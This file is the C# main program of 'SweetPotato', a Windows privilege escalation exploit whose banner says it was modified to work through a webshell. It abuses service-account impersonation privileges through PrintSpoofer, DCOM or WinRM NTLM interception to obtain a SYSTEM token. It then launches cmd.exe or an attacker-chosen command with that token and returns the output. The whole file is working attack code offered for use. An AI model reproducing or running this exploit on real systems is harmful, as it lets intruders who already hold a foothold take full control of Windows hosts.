﻿using Microsoft.Win32;
using Mono.Options;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using static SweetPotato.ImpersonationToken;

namespace SweetPotato {
    class Program {

        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        static void Main(string[] args) {

            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\cmd.exe";
            string programArgs = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            PotatoAPI.Mode mode = PotatoAPI.Mode.PrintSpoofer;
            bool showHelp = false;
            bool isBITSRequired = false;
            bool flag = false;

            Console.WriteLine(
                "Modifying SweetPotato by Uknow to support webshell\n" +
                "Github: https://github.com/uknowsec/SweetPotato \n" +
                "SweetPotato by @_EthicalChaos_\n" +
                 "  Orignal RottenPotato code and exploit by @foxglovesec\n" +
                 "  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery\n" + 
                 "  PrintSpoofer discovery and original exploit by @itm4n"
                );

            OptionSet option_set = new OptionSet()
                .Add<string>("c=|clsid=", "CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)
                .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                .Add("p=|prog=", "Program to launch (default cmd.exe)", v => program = v)
                .Add("a=|args=", "Arguments for program (default null)", v => programArgs = v)
                .Add<PotatoAPI.Mode>("e=|exploit=", "Exploit mode [DCOM|WinRM|PrintSpoofer(default)] ", v => mode = v)
                .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    PrintHelp(option_set);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try {

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {
                    Console.WriteLine("[!] Cannot perform interception, necessary privileges missing.  Are you running under a Service account?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                if (mode == PotatoAPI.Mode.PrintSpoofer) {
                    Console.WriteLine($"[+] Attempting NP impersonation using method PrintSpoofer to launch {program}");
                } else {
                    Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}",
                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 : port, executionMethod, program);
                }

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, mode);

                if (!potatoAPI.Trigger()) {
                    Console.WriteLine("[!] No authenticated interception took place, exploit failed");
                    return;
                }

                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {
                    Console.WriteLine("[!] Failed to impersonate security context token");
                    return;
                }

                SECURITY_ATTRIBUTES saAttr = new SECURITY_ATTRIBUTES();
                saAttr.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                saAttr.bInheritHandle = 0x1;
                saAttr.lpSecurityDescriptor = IntPtr.Zero;

                if (CreatePipe(ref out_read, ref out_write, ref saAttr, 0))
                {
                    Console.WriteLine("[+] CreatePipe success");
                }

                SetHandleInformation(out_read, HANDLE_FLAG_INHERIT, 0);
                SetHandleInformation(err_read, HANDLE_FLAG_INHERIT, 0);
                Thread systemThread = new Thread(() => {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";
                    si.hStdOutput = out_write;
                    si.hStdError = err_write;
                    si.dwFlags |= STARTF_USESTDHANDLES;

                    //Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;

                    if(programArgs != null)
                    {
                        if (program.Equals("c:\\Windows\\System32\\cmd.exe"))
                        {
                            programArgs = "/c " + programArgs;
                        }
                        finalArgs = string.Format("\"{0}\" {1}", program, programArgs);
                        Console.WriteLine("[+] Command : {0} ", finalArgs);
                    }

                    if (executionMethod == ExecutionMethod.Token) {
                        flag = CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.NewConsole, IntPtr.Zero, null, ref si, out pi);
                        if (flag)
                        {
                            Console.WriteLine("[+] process with pid: {0} created.\n\n=====================================\n", pi.dwProcessId);
                        }
                        else
                        {
                            Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    else {
                        flag = CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, CREATE_NEW_CONSOLE, IntPtr.Zero, @"C:\", ref si, out pi);
                        if(flag)
                        {
                            Console.WriteLine("[+] process with pid: {0} created.\n\n=====================================\n", pi.dwProcessId);

                        }
                        else
                        {
                            Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    CloseHandle(out_write);
                    byte[] buf = new byte[BUFSIZE];
                    int dwRead = 0;
                    while (ReadFile(out_read, buf, BUFSIZE, ref dwRead, IntPtr.Zero))
                    {
                        byte[] outBytes = new byte[dwRead];
                        Array.Copy(buf, outBytes, dwRead);
                        Console.WriteLine(System.Text.Encoding.Default.GetString(outBytes));
                    }
                    CloseHandle(out_read);
                    Console.WriteLine("[+] Process created, enjoy!");
                });

                systemThread.Start();
                systemThread.Join();

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to exploit COM: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }
    }
}
